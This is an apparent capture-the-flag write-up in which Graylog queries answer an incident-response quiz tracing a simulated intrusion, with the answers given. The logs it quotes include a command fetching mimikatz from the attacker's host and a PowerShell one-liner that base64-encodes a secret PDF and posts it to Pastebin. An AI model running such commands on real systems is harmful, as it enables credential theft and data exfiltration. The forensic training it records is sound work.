## Problem Statement:

> 9) Retrieve Scraps of Paper from Server  
> Difficulty: 4/5  
> Gain access to the data on the Student Portal server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.


===============================================================================
## Solution(hint):

First let's visit Pepper Minstix in the _Dorm_ for the hint.  
He needs us to complete the Incidence Response form using the Graylog instance.

hint given for this sub-problem:

> [Graylog Docs](http://docs.graylog.org/en/3.1/pages/queries.html)  
> (Events and Sysmon)

Let's get into the terminal:

![](./res/pic1.png)

Bottom right is the Incidence Response form to complete.  
Login using the following credentials:  
> username: elfustudent  
> password: elfustudent


### Question 1:  
> What is the full-path + filename of the first malicious file downloaded by Minty?

Search in all messages and without time filter.  
search: `UserAccount:minty AND EventID:1 AND Download*`  and sort by earliest timestamp

Answer: **C:\Users\minty\Downloads\cookie_recipe.exe**

### Question 2:  
> The malicious file downloaded and executed by Minty gave the attacker remote access to his machine. What was the ip:port the malicious file connected to first?

Search: `ProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe AND _exists_:DestinationIp`

Answer: **192.168.247.175:4444**

### Question3:  
> What was the first command executed by the attacker?

Search: `ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe`  
Follow the CommandLine output.

Answer: **whoami**

### Question 4:  
> What is the one-word service name the attacker used to escalate privileges?

Continue search: `ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe`  
Further down the timestamp will find Invoke-WebRequest to download another .exe and start webexservice.

Answer: **webexservice**

### Question 5:  
> What is the file-path + filename of the binary ran by the attacker to dump credentials?

Attacker has download cookie_recipe2.exe, so we pivot from cookie_recipe2.exe.  
Search: `ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe2.exe`  
Down the timestamp we will see a command line:  
> C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\cookie.exe "  
Mimikatz is used to dump credentials.

Answer: **C:\cookie.exe**

### Question 6:  
> The attacker pivoted to another workstation using credentials gained from Minty's computer. Which account name was used to pivot to another machine?

Search : `EventID: 4624 AND SourceNetworkAddress:192.168.247.175`  
EventID: 4624 is generated when there is successful network login

Answer: **alabaster**

### Question 7:  
> What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine?

search `SourceNetworkAddress:192.168.247.175 AND LogonType: 10`  
LogonType:10 refers to RDP login.  
Look for EventID:4624, as 4625 is failed login.

Answer: **06:04:28**

### Question 8:  
> The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. What is the SourceHostName,DestinationHostname,LogonType of this connection?

At RDP login, the hostname was elfu-res-wks2.  
Search: `SourceHostName: elfu-res-wks2` --reveals a logonType:3 to elfu-res-wks3.

Answer: **elfu-res-wks2,elfu-res-wks3,3**

### Question 9:  
> What is the full-path + filename of the secret research document after being transferred from the third host to the second host?

Continue search: `UserAccount: alabaster`  
Reveals a command line:  
> C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri https://pastebin.com/post.php -Method POST -Body @{ "submit_hidden" = "submit_hidden"; "paste_code" = $([Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf"))); "paste_format" = "1"; "paste_expire_date" = "N"; "paste_private" = "0"; "paste_name"="cookie recipe" }

Answer: **C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf**

### Question 10:  
> What is the IPv4 address (as found in logs) the secret research document was exfiltrated to?

Continuing from previous question, look for DestinationIP.

Answer: **104.22.3.84**


## Solution(main):

Solving the hint problem will give us the following hints:

> [SQL Injection from OWASP](https://www.owasp.org/index.php/SQL_Injection)  
> [Sqlmap Tamper Scripts](https://pen-testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win)




